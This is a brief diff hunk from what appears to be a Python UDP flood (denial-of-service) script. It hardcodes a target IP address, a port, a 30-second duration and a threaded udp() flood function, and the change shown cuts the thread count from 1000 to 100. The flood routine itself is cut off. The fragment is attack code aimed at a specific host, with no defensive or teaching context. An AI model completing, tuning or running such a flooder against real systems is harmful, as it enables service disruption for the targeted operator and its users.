@@ -7,7 +7,7 @@ import random
 from threading import Thread
 ip="185.59.45.2"
 port=0
-threads=1000
+threads=100
 endtime=30
 def udp(ip,port,floodtime):
 	global packets
